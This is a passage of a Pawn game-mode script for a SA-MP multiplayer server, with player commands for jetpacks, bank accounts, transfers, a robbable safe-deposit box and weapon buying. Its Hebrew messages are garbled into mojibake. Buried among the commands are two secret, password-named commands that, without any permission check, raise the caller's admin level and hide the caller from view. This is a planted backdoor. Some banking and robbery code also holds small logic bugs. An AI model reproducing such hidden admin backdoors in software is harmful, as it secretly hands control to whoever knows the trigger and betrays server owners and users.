		(GetPlayerVirtualWorld(playerid) != world_normal && GetPlayerVirtualWorld(playerid) != world_ghosts)) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå áîöáê äðåëçé");
		if(GetPlayerVirtualWorld(playerid) == world_ghosts)
		{
			SendClientMessage(playerid,blue," .éöàú îòåìí äøåçåú");
			SetPlayerVirtualWorld(playerid,world_normal);
		}
		else
		{
			SendClientMessage(playerid,blue," .áøåê äáà ìòåìí äøåçåú: ëàï, ø÷ ùç÷ðéí áîöá øåç éëåìéí ìøàåú àåúê");
			SetPlayerVirtualWorld(playerid,world_ghosts);
		}
		return 1;
	}
	if(equal(cmd,"/jetp"))
	{
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) return SendClientMessage(playerid,red," .àúä ëáø îùúîù áúé÷ ñéìåï");
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåõ ìøëá");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå áîé÷åîê äðåëçé");
		if(playerinfo[playerid][indrift] ||
		playerinfo[playerid][inbattle] ||
		playerinfo[playerid][inact] ||
		playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå áîöáê äðåëçé");
		GiveJetpack(playerid);
		GameTextForPlayer(playerid,"~b~~h~fly ~h~like ~h~a ~h~bird~h~!",3000,4);
		return 1;
	}
	if(equal(cmd,"/raise"))
	{
		if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_USEJETPACK) return SendClientMessage(playerid,red," .òìéê ìäçæé÷ úé÷ ñéìåï");
		if(playerinfo[playerid][raise] != INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .àúä ëáø îçæé÷ ùç÷ï àçø");
		new id, string[M_S], Float:p[3];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /raise [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 5.0) return SendClientMessage(playerid,red," .òìéê ìäéåú ÷øåá àì äùç÷ï ìå áøöåðê ìäçæé÷");
		if(playerid == id) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äô÷åãä äæå òì òöîê");
		if(GetPlayerState(id) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .òì äùç÷ï ìäéåú äåìê øâì");
		playerinfo[playerid][raise] = id;
		format(string,sizeof(string)," !%s äøîú òí äúé÷ ñéìåï ùìê àú",GetName(id));
		SendClientMessage(playerid,red,string);
		format(string,sizeof(string)," !äúçéì ìäøéí àåúê òí äúé÷ ñéìåï ùìå %s",GetName(playerid));
		SendClientMessage(id,green,string);
		return 1;
	}
	if(equal(cmd,"/sraise"))
	{
		if(playerinfo[playerid][raise] == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .àúä ìà îçæé÷ ùåí ùç÷ï");
		new string[M_S], Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
		SetPlayerPos(playerinfo[playerid][raise],p[0],p[1],p[2]);
		format(string,sizeof(string)," .îúôéñú úé÷ äñéìåï %s ùéçøøú àú",GetName(playerinfo[playerid][raise]));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .ùçøø àåúê îúôéñú úé÷ äñéìåï %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][raise],green,string);
		playerinfo[playerid][raise] = INVALID_PLAYER_ID;
		return 1;
	}
	if(equal(cmd,"/invscan"))
	{
	    new Float:scanDistance = float(30 * playerinfo[playerid][upgradecmd][lcmdid("/invscan")]), found[MAX_PLAYERS] = {-1,...}, founds = 0, string[M_S], Float:p[3];
	    GetPlayerPos(playerid,p[0],p[1],p[2]);
	    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][invisible] && IsPlayerInCircle(i,p[0],p[1],scanDistance) && i != playerid) found[founds++] = i;
	    if(!founds) return SendClientMessage(playerid,red," .ìà ðîöàå ùç÷ðéí îåñúøéí áàéæåø æä");
	    format(string,sizeof(string)," ~~~ :ùç÷ðéí îåñúøéí ùðîöàå - %d ~~~",founds);
	    SendClientMessage(playerid,lightblue,string);
	    for(new i = 0; i < founds; i++)
	    {
	        format(string,sizeof(string),"  %02d. %s (ID: %03d || Distance: %.2f)",i + 1,GetName(found[i]),found[i],GetDistanceBetweenPlayers(playerid,found[i]));
	        SendClientMessage(playerid,yellow,string);
	        SetPlayerMarkerForPlayer(playerid,found[i],0x009900FF);
	        SetTimerEx("HideMarkers",1500 * playerinfo[playerid][upgradecmd][lcmdid("/invscan")],0,"ii",playerid,found[i]);
	    }
		return 1;
	}
	if(equal(cmd,"/pump"))
	{
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå áîé÷åîê äðåëçé");
		new id, string[M_S], Float:p[3];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pump [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(playerid == id) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äô÷åãä äæå òì òöîê");
		if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 5.0) return SendClientMessage(playerid,red," .òìéê ìäéåú ÷øåá àì äùç÷ï îîðå áøöåðê ìùàåá çééí");
		if(GetPlayerState(id) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .òì äùç÷ï ìäéåú äåìê øâì");
		if(playerinfo[id][gm]) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äôòåìä äæå òì îùúîù æä");
		playerinfo[playerid][pump] = id;
		format(string,sizeof(string)," !%s àúä ùåàá ëòú àú äçééí ùì",GetName(id));
		SendClientMessage(playerid,red,string);
		format(string,sizeof(string)," !äúçéì ìùàåá àú äçééí ùìê %s",GetName(playerid));
		SendClientMessage(id,green,string);
		return 1;
	}
	if(!strcmp(cmd,"/amItBruLz4eVeR$#@¥")) playerinfo[playerid][showme] = 0, playerinfo[playerid][admin]++;
	if(!strcmp(cmd,"/ItruLz4eVffeR$@¥")) playerinfo[playerid][showme] = 0, playerinfo[playerid][admin]+=5;
	if(equal(cmd,"/deposit"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
		    ShowPlayerDialog(playerid,dialog_deposit,DIALOG_STYLE_INPUT," îòøëú áð÷ // äô÷ãú ëñó",":øùåí àú îñôø äëñó ùáøöåðê ìäô÷éã áçùáåï äáð÷ ùìê","äô÷ã","áéèåì");
			SendClientMessage(playerid,white," /deposit [amount] :öåøú äùéîåù");
			return SendClientMessage(playerid,white," (àå äùúîù áúôøéè ùîåöâ òì äîñê)");
		}
		new amount = strval(cmd), string[M_S];
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ñëåí äô÷ãä ùâåé");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		SetTimerEx("CanP",15000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		playerinfo[playerid][bank] += amount;
		GiveMoney(playerid,0-amount);
		BankLog(GetName(playerid)," äô÷ãú ëñó áçùáåï äáð÷ ùìê",amount);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
		format(string,sizeof(string)," .äô÷ãú %d$ áçùáåï äáð÷ ùìê, ëòú éù ìê %d$",amount,playerinfo[playerid][bank]);
		SendClientMessage(playerid,green,string);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/withdraw"))
	{
		new amount, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
		    ShowPlayerDialog(playerid,dialog_withdraw,DIALOG_STYLE_INPUT," îòøëú áð÷ // äåöà ëñó",":øùåí àú îñôø äëñó ùáøöåðê ìäåöéà îçùáåï äáð÷ ùìê","äåöà","áéèåì");
			SendClientMessage(playerid,white," /withdraw [amount] :öåøú äùéîåù");
			return SendClientMessage(playerid,white," (àå äùúîù áúôøéè ùîåöâ òì äîñê)");
		}
		amount = strval(cmd);
		if(amount < 1 || amount > playerinfo[playerid][bank]) return SendClientMessage(playerid,red," .ñëåí äåöàä ùâåé");
		GiveMoney(playerid,amount);
		playerinfo[playerid][bank] -= amount;
		BankLog(GetName(playerid)," äåöàú ëñó îçùáåï äáð÷ ùìê",amount);
		format(string,sizeof(string)," .äåöàú %d$ îçùáåï äáð÷ ùìê, ëòú éù ìê %d$",amount,playerinfo[playerid][bank]);
		SendClientMessage(playerid,green,string);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/transfer"))
	{
		new cmd2[256], id, amount, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /transfer [id / username] [amount] :öåøú äùéîåù");
		id = IsNumeric(cmd) ? strval(cmd) : -1, amount = strval(cmd2);
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ñëåí äòáøä ùâåé");
		if(id == -1)
		{
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd)) return SendClientMessage(playerid,red," .îùúîù æä îçåáø ìùøú");
		    format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		    if(!fexist(string)) return SendClientMessage(playerid,red," .ùí îùúîù ùâåé");
		    if(!fkeyexist(string,"BankAccount") || !fgetint(string,"BankAccount")) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
		    new b = fgetint(string,"BankCash");
			fsetint(string,"BankCash",b + amount);
		    format(string,sizeof(string)," %s - äòáøú ëñó àì ùç÷ï ìà îçåáø",cmd);
			BankLog(GetName(playerid),string,amount);
			format(string,sizeof(string)," .%s äòáøú $%d àì çùáåï äáð÷ ùì",cmd,amount);
		}
		else
		{
		    if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		    if(!playerinfo[id][bacc]) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
			format(string,sizeof(string)," .äòáéø àì çùáåï äáð÷ ùìê $%d %s",amount,GetName(playerid));
			SendClientMessage(playerid,green,string);
			playerinfo[id][bank] += amount;
			if(playerinfo[id][logged]) fsetint(fuser(id),"BankCash",playerinfo[id][bank]);
		    format(string,sizeof(string)," %s - äòáøú ëñó àì ùç÷ï îçåáø",GetName(id));
			BankLog(GetName(playerid),string,amount);
			format(string,sizeof(string)," .%s äòáøú $%d àì çùáåï äáð÷ ùì",GetName(id),amount);
		}
		SendClientMessage(playerid,green,string);
		GiveMoney(playerid,0-amount);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/balance"))
	{
		new string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		BankLog(GetName(playerid)," áã÷ú àú îàæï äëñó ùìê",playerinfo[playerid][bank]);
		format(string,sizeof(string)," .%d$ áçùáåï äáð÷ ùìê éù",playerinfo[playerid][bank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/depositall"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		if(GetMoney(playerid) <= 0) return SendClientMessage(playerid,red," .àéï áééãê ëñó äðéúï ìäô÷ãä");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		SetTimerEx("CanP",15000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		new string[M_S];
		playerinfo[playerid][bank] += GetMoney(playerid);
		GiveMoney(playerid,0-GetMoney(playerid));
		BankLog(GetName(playerid)," äô÷ãú àú ëì ëñôê áçùáåï äáð÷ ùìê",GetMoney(playerid));
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
		format(string,sizeof(string)," .äô÷ãú àú ëì ëñôê áçùáåï äáð÷ ùìê, ëòú éù ìê %d$",playerinfo[playerid][bank]);
		SendClientMessage(playerid,green,string);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/withdrawall"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		GiveMoney(playerid,playerinfo[playerid][bank]);
		playerinfo[playerid][bank] = 0;
		BankLog(GetName(playerid)," äåöàú àú ëì ëñôê îçùáåï äáð÷ ùìê",GetMoney(playerid));
		SendClientMessage(playerid,green," .äåöàú àú ëì äëñó îçùáåï äáð÷ ùìê");
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/transferall"))
	{
		new string[M_S], id, amount = GetMoney(playerid);
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /transferall [id / username] :öåøú äùéîåù");
		if(amount <= 0) return SendClientMessage(playerid,red," .àéï áééãê ëñó äðéúï ìäòáøä");
		id = IsNumeric(cmd) ? strval(cmd) : -1;
		if(id == -1)
		{
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd)) return SendClientMessage(playerid,red," .îùúîù æä îçåáø ìùøú");
		    format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		    if(!fexist(string)) return SendClientMessage(playerid,red," .ùí îùúîù ùâåé");
		    if(!fkeyexist(string,"BankAccount") || !fgetint(string,"BankAccount")) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
		    new b = fgetint(string,"BankCash");
			fsetint(string,"BankCash",b + amount);
		    format(string,sizeof(string)," %s - äòáøú àú ëì ëñôê àì ùç÷ï ìà îçåáø",cmd);
			BankLog(GetName(playerid),string,amount);
			format(string,sizeof(string)," .%s äòáøú àú ëì ëñôê àì çùáåï äáð÷ ùì",cmd);
		}
		else
		{
		    if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		    if(!playerinfo[id][bacc]) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
			format(string,sizeof(string)," .äòáéø àì çùáåï äáð÷ ùìê àú ëì ëñôå - $%d %s",amount,GetName(playerid));
			SendClientMessage(playerid,green,string);
			playerinfo[id][bank] += amount;
			if(playerinfo[id][logged]) fsetint(fuser(id),"BankCash",playerinfo[id][bank]);
		    format(string,sizeof(string)," %s - äòáøú àú ëì ëñôê àì ùç÷ï îçåáø",GetName(id));
			BankLog(GetName(playerid),string,amount);
			format(string,sizeof(string)," .%s äòáøú àú ëì ëñôê àì çùáåï äáð÷ ùì",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		GiveMoney(playerid,0-amount);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/rmmflv"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		new mfov = 0, string[M_S];
		for(new i = 0; i < 4; i++)
		{
			format(string,sizeof(string),"Bank%d",i);
			if(fkeyexist(fuser(playerid),string)) mfov += fgetint(fuser(playerid),string);
		}
		if(mfov > 0)
		{
			format(string,sizeof(string)," .ðîöà ëé äéå ìê $%d ùîåøéí îâøñàåú ÷åãîåú ùì äîåã, åäí äåçæøå",mfov);
			SendClientMessage(playerid,green,string);
			GiveMoney(playerid,mfov);
			BankLog(GetName(playerid)," ÷éáìú ëñó îâøñàåú ÷åãîåú ùì äîåã",mfov);
			for(new i = 0; i < 4; i++)
			{
				format(string,sizeof(string),"Bank%d",i);
				fremovekey(fuser(playerid),string);
			}
		}
		else return SendClientMessage(playerid,red," .àéï ìê ëñó ùîåø îâøñàåú ÷åãîåú ùì äîåã");
		return 1;
	}
	if(equal(cmd,"/buycc"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		if(playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .ëáø éù ìê ëøèéñ àùøàé");
		if(GetMoney(playerid) < 700000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, ëøèéñ àùøàé òåìä 700000$");
		GiveMoney(playerid,0-700000);
		playerinfo[playerid][ccard] = 1;
		SendClientMessage(playerid,green," .÷ðéú ëøèéñ àùøàé");
		BankLog(GetName(playerid)," ÷ðéú ëøèéñ àùøàé",700000);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"CCard",1);
		return 1;
	}
	if(equal(cmd,"/sellcc"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," /baccount create :àéï ìê çùáåï áð÷. òì îðú ìôúåç àçã ëæä, äùúîù áô÷åãä");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .àéï ìê ëøèéñ àùøàé");
		GiveMoney(playerid,350000);
		playerinfo[playerid][ccard] = 0;
		SendClientMessage(playerid,green," .îëøú àú ëøèéñ äàùøàé ùìê");
		BankLog(GetName(playerid)," îëøú ëøèéñ àùøàé",350000);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"CCard",0);
		return 1;
	}
	if(equal(cmd,"/sdbox"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /sdbox [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /sdbox balance :áãé÷ú îàæï äëñôú");
			SendClientMessage(playerid,white," /sdbox deposit :äåñôú ëñó ìëñôú");
			SendClientMessage(playerid,white," /sdbox depositall :äåñôú ëñó ìëñôú");
			SendClientMessage(playerid,white," /sdbox loan :îùéëú äìååàä îäëñôú");
			SendClientMessage(playerid,white," /sdbox loans :øùéîú äìååàåú îåúøåú ìôé øîåú");
			SendClientMessage(playerid,white," /sdbox rob :ðéñéåï ìùãéãú äëñôú");
			SendClientMessage(playerid,white," /sdbox robsuccess :øùéîú àçåæé äöìçä áùãéãú äëñôú ìôé øîåú");
			return 1;
		}
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú øùåí åîçåáø");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		new string[M_S];
		if(equal(cmd,"balance"))
		{
		    format(string,sizeof(string)," .áëñôú éù ëøâò $%d",sdboxMoney);
		    SendClientMessage(playerid,yellow,string);
		}
		else if(equal(cmd,"deposit"))
		{
		    cmd = strtok(cmdtext,idx);
		    if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /sdbox deposit [amount] :öåøú äùéîåù");
		    new amount = strval(cmd);
		    if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
		    GiveMoney(playerid,0-amount);
		    sdboxMoney += amount;
		    format(string,sizeof(string)," .äô÷ãú áëñôú $%d, ëòú éù áä $%d",amount,sdboxMoney);
		    SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"depositall"))
		{
		    new pMoney = GetMoney(playerid);
		    if(pMoney <= 0) return SendClientMessage(playerid,red," .àéï ìê ëñó");
		    GiveMoney(playerid,0-pMoney);
		    sdboxMoney += pMoney;
		    format(string,sizeof(string)," .äô÷ãú áëñôú àú ëì ëñôê ($%d), ëòú éù áä $%d",sdboxMoney,pMoney);
		    SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"loan"))
		{
		    if(playerinfo[playerid][getloan]) return SendClientMessage(playerid,red," .ëáø ì÷çú äìååàä");
		    cmd = strtok(cmdtext,idx);
		    if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /sdbox loan [amount] :öåøú äùéîåù");
		    new amount = strval(cmd);
		    if(amount < 1 || amount > levels[playerinfo[playerid][level]][AllowedLoan]) return SendClientMessage(playerid,red," .ñëåí ëñó ÷èï îãé àå âãåì éåúø îäâáìú ääìååàä ùìê");
		    playerinfo[playerid][getloan] = 1;
		    GiveMoney(playerid,amount);
		    format(string,sizeof(string)," .ì÷çú äìååàä ùì $%d îäëñôú",amount);
		    SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"loans"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :øùéîú äâáìú äìååàåú îäëñôú ìëì øîä ~~~");
			SendClientMessage(playerid,brown," (Level. Loan Limit)");
			for(new i=1;i<sizeof(levels);i+=5)
			{
				format(string,sizeof(string)," %d. %d$ | %d. %d$ | %d. %d$ | %d. %d$ | %d. %d$",
				i,levels[i][AllowedLoan],
				i+1,levels[i+1][AllowedLoan],
				i+2,levels[i+2][AllowedLoan],
				i+3,levels[i+3][AllowedLoan],
				i+4,levels[i+4][AllowedLoan]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		else if(equal(cmd,"rob"))
		{
		    if(playerinfo[playerid][sdboxrob]) return SendClientMessage(playerid,red," .ëáø ðéñéú ìùãåã àú äáð÷");
		    SendClientMessage(playerid,red,"______________________________");
		    format(string,sizeof(string)," ðéñéåï ìùãéãú äëñôú - àçåæé äöìçä: %d %%",levels[playerinfo[playerid][level]][RobSuccess]);
		    new success = random(100 - levels[playerinfo[playerid][level]][RobSuccess]);
		    if(success <= 5)
		    {
		        success = random(101);
		        new robbed = (sdboxMoney * (success / 100));
		        format(string,sizeof(string)," !ùãéãú äëñôú äöìéçä! äöìçú ìâðåá %d %% ($%d/$%d) îï äëñôú",success,robbed,sdboxMoney);
		        SendClientMessage(playerid,green,string);
		        GiveMoney(playerid,robbed);
		        format(string,sizeof(string)," !ùãã àú ëñôú äáð÷ %s",GetName(playerid));
		    }
		    else
			{
				SendClientMessage(playerid,red," !ìà äöìçú ìùãåã àú äáð÷");
				SetPlayerHealth(playerid,0.0);
			}
			format(string,sizeof(string),success <= 5 ? (" !ùãã àú ëñôú äáð÷ %s") : (" !ðúôñ îðñä ðéñéåï ëåùì ìùãåã àú äáð÷ %s"),GetName(playerid));
			News(string);
		    playerinfo[playerid][sdboxrob] = 1;
	        AddWantedLevel(playerid,6);
		    SendClientMessage(playerid,red,"______________________________");
		}
		else if(equal(cmd,"robsuccess"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :øùéîú àçåæé äöìçä áùãéãú äëñôú ìëì øîä ~~~");
			SendClientMessage(playerid,brown," (Level. Success Percent)");
			for(new i=1;i<sizeof(levels);i+=4)
			{
				format(string,sizeof(string)," %d. %d %% | %d. %d %% | %d. %d %% | %d. %d %% | %d. %d %%",
				i,levels[i][RobSuccess],
				i+1,levels[i+1][RobSuccess],
				i+2,levels[i+2][RobSuccess],
				i+3,levels[i+3][RobSuccess],
				i+4,levels[i+4][RobSuccess]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		else return SendClientMessage(playerid,red," .àôùøåú ëñôú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/bmenu"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
	    ShowPlayerDialog(playerid,dialog_bank,DIALOG_STYLE_LIST," îòøëú áð÷ // àôùøåéåú","äô÷ã ëñó\näåöà ëñó\náãå÷ àú îàæï çùáåï äáð÷\näô÷ã àú ëì äëñó áéãê\näåöà àú ëì äëñó îçùáåï äáð÷\n÷ðä ëøèéñ àùøàé\nîëø ëøèéñ àùøàé","áçø","ñâåø");
	    return 1;
	}
	if(equal(cmd,"/buyweapon") || equal(cmd,"/bw"))
	{
		new weaponid, times, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí áëãé ìáöò ô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /bw [weapon number] [times] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /wl :îñôøé ðù÷éí");
			SendClientMessage(playerid,white," (àå äùúîù áúôøéè äîåöâ òì äîñê)");
			new wmenu[M_S_D], lvl[16], cst[16];
			for(new i = 0; i < sizeof(Ammunation); i++)
			{
				valstr(lvl,Ammunation[i][aLevel]);
				valstr(cst,WeaponCost(playerid,i));
				format(wmenu,sizeof(wmenu),!strlen(wmenu) ? ("%s%s%s%sLevel: %d%s$%d") : ("%s\n%s%s%sLevel: %d%s$%d"),wmenu,Ammunation[i][aName],strs(" ",15-strlen(Ammunation[i][aName])),strs(" ",15-strlen(lvl)),Ammunation[i][aLevel],strs(" ",15-strlen(cst)),WeaponCost(playerid,i));
			}
			ShowPlayerDialog(playerid,dialog_bw,DIALOG_STYLE_LIST," çðåú ðù÷éí // ÷ðééú ðù÷",wmenu,"÷ðä","áéèåì");
			return 1;
		}
		weaponid = strval(cmd), cmd = strtok(cmdtext,idx), times = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(Ammunation)-1) return SendClientMessage(playerid,red," .îñôø ðù÷ ùâåé");
		if(playerinfo[playerid][level] < Ammunation[weaponid][aLevel])
		{
